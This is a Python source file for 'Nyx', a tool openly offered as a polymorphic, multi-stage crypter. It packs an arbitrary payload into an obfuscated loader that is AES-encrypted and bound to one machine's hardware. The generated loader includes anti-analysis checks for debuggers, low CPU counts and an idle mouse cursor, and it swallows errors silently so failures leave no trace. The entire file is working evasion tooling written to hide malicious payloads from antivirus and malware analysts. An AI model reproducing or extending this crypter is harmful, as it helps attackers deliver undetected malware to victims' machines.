# nyx_builder.py
#
# An advanced, polymorphic, multi-stage crypter for Python payloads.
# This tool packs a Python script into a stealthy, multi-layered, and
# hardware-bound loader designed to evade static and dynamic analysis.

import os
import zlib
import base64
import random
import string
import hashlib
import marshal
import py_compile
import uuid
import platform
import sys
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

# --- Configuration ---
# These variables define the default input and output file names.
# For more flexibility, consider implementing command-line arguments.
SOURCE_FILE = "payload.py"
OUTPUT_FILE = "packed_loader.py"

# --- Core Components ---

class SimpleStreamCipher:
    """A simple, deterministic stream cipher based on a seeded hash."""
    def __init__(self, key: bytes):
        self.stream_key = hashlib.sha512(key).digest()
        self.key_len = len(self.stream_key)
    
    def process(self, data: bytes) -> bytes:
        """XORs data with the repeating stream key. This is its own inverse."""
        return bytes([b ^ self.stream_key[i % self.key_len] for i, b in enumerate(data)])

    def encrypt(self, data: bytes) -> bytes:
        return self.process(data)
    
    def decrypt(self, data: bytes) -> bytes:
        return self.process(data)

def generate_random_name(length=12):
    """Generates a random lowercase string for polymorphic names."""
    return ''.join(random.choice(string.ascii_lowercase) for _ in range(length))

def compile_to_marshaled_bytecode(source_code: str, temp_filename: str) -> bytes:
    """
    Compiles a Python source string into optimized, marshaled bytecode.
    This process avoids storing readable strings in the final loader.
    """
    pyc_file = temp_filename + '.pyc'
    temp_py_file = temp_filename + '.py'
    try:
        with open(temp_py_file, "w", encoding='utf-8') as f:
            f.write(source_code)
        
        py_compile.compile(temp_py_file, cfile=pyc_file, doraise=True, optimize=2)
        
        with open(pyc_file, 'rb') as f:
            f.seek(16) # Skip the 16-byte .pyc header
            code_obj = marshal.load(f)
        
        return marshal.dumps(code_obj)
    finally:
        # Clean up temporary files
        for f_ in [temp_py_file, pyc_file]:
             if os.path.exists(f_):
                os.remove(f_)

def get_builder_hw_key():
    """Generates a hardware-unique key from the machine running the builder."""
    print("[*] Generating hardware key from the build machine...")
    try:
        mac = hex(uuid.getnode())
        proc_arch = platform.machine()
        plat_info = platform.platform()
        hw_string = f"{mac}-{proc_arch}-{plat_info}"
        key = hashlib.sha512(hw_string.encode('utf-8')).digest()
        print("[+] Hardware key generated. Loader will be bound to this machine's profile.")
        return key
    except Exception as e:
        print(f"[!] Warning: Could not generate a unique hardware key: {e}")
        print("[!] Using a generic fallback key. The loader will NOT be machine-specific.")
        return hashlib.sha512(b"generic_fallback_key").digest()

def create_loader():
    """Main function to build the crypter and generate the final loader."""
    print(f"[*] Reading payload from '{SOURCE_FILE}'...")
    try:
        with open(SOURCE_FILE, 'r', encoding='utf-8') as f:
            final_payload_code_str = f.read()
    except FileNotFoundError:
        print(f"[!] Error: Source file '{SOURCE_FILE}' not found. Aborting.")
        return

    # --- Stage 3: Final Payload Preparation ---
    print("[*] Compiling final payload to bytecode...")
    final_payload_bytecode = compile_to_marshaled_bytecode(final_payload_code_str, "temp_payload")

    # --- Stage 2: Intermediate Loader Preparation ---
    print("[*] Generating Stage 2 (in-memory AES decryptor)...")
    aes_key, iv = os.urandom(32), os.urandom(16)
    cipher_aes = AES.new(aes_key, AES.MODE_CBC, iv)
    compressed_payload = zlib.compress(final_payload_bytecode, 9)
    encrypted_final_payload = cipher_aes.encrypt(pad(compressed_payload, AES.block_size))
    
    s2_vars = {name: generate_random_name() for name in ["payload", "key", "iv"]}
    
    stage2_code_str = f"""
import zlib, base64, marshal, sys
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
try:
    p = base64.b85decode({repr(base64.b85encode(encrypted_final_payload))})
    k = base64.b85decode({repr(base64.b85encode(aes_key))})
    i = base64.b85decode({repr(base64.b85encode(iv))})
    c = AES.new(k, AES.MODE_CBC, i)
    d = unpad(c.decrypt(p), AES.block_size)
    m = zlib.decompress(d)
    if m:
        # exec is a statement in Python 2, a function in Python 3
        if sys.version_info.major < 3:
            exec marshal.loads(m)
        else:
            exec(marshal.loads(m))
except:
    pass
"""

    print("[*] Compiling Stage 2 to bytecode...")
    stage2_bytecode = compile_to_marshaled_bytecode(stage2_code_str, "temp_stage2")
    
    # --- Stage 1: Final Loader Generation ---
    print("[*] Generating final Stage 1 loader (hardware-bound)...")
    builder_hw_key = get_builder_hw_key()
    custom_cipher = SimpleStreamCipher(builder_hw_key)
    encrypted_stage2 = custom_cipher.encrypt(stage2_bytecode)

    s1_names = {name: generate_random_name() for name in ["payload", "cipher", "get_key", "anti_analysis"]}
    
    loader_code = f"""
# Nyx Loader - Final Stealth Version (Hardware-Bound)
import base64, hashlib, sys, os, time, random, ctypes, zlib, marshal
try: from Crypto.Cipher import AES; from Crypto.Util.Padding import unpad
except ImportError: sys.exit()

def {s1_names['anti_analysis']}():
    if sys.gettrace() is not None: os._exit(0)
    try:
        if hasattr(os, 'cpu_count') and os.cpu_count() < 2: os._exit(0)
    except: pass
    if os.name == 'nt':
        try:
            p, t = ctypes.windll.user32.GetCursorPos, ctypes.Structure
            class _p(t): _fields_ = [("x", ctypes.c_long), ("y", ctypes.c_long)]
            p1 = _p(); p(ctypes.byref(p1)); time.sleep(random.randint(4, 8)); p2 = _p(); p(ctypes.byref(p2))
            if abs(p1.x - p2.x) < 15 and abs(p1.y - p2.y) < 15: os._exit(0)
        except: pass

def {s1_names['get_key']}():
    # This function must be identical to the builder's get_builder_hw_key
    try:
        import uuid, platform
        mac = hex(uuid.getnode())
        proc_arch = platform.machine()
        plat_info = platform.platform()
        hw_string = "{{}}-{{}}-{{}}".format(mac, proc_arch, plat_info)
        return hashlib.sha512(hw_string.encode('utf-8')).digest()
    except:
        return hashlib.sha512(b"generic_fallback_key").digest()

class {s1_names['cipher']}:
    def __init__(self, k: bytes): self.s = hashlib.sha512(k).digest(); self.l = len(self.s)
    def d(self, d: bytes) -> bytes: return bytes([b ^ self.s[i % self.l] for i, b in enumerate(d)])

{s1_names['payload']} = {repr(base64.b85encode(encrypted_stage2))}

if __name__ == "__main__":
    {s1_names['anti_analysis']}()
    try:
        h = {s1_names['get_key']}()
        c = {s1_names['cipher']}(h)
        d = c.d(base64.b85decode({s1_names['payload']}))
        if d:
            if sys.version_info.major < 3:
                exec marshal.loads(d)
            else:
                exec(marshal.loads(d))
    except:
        pass
"""
    
    with open(OUTPUT_FILE, 'w', encoding='utf-8') as f:
        f.write(loader_code)
    print(f"\n[+] Success! Final stealth loader '{OUTPUT_FILE}' created.")
    print(f"[*] This loader is now bound to the hardware profile of THIS machine.")

if __name__ == "__main__":
    if not os.path.exists(SOURCE_FILE):
        print(f"[*] Source file '{SOURCE_FILE}' not found. Creating a silent dummy payload.")
        with open(SOURCE_FILE, "w") as f:
            f.write("pass # Silent dummy payload")
    
    create_loader()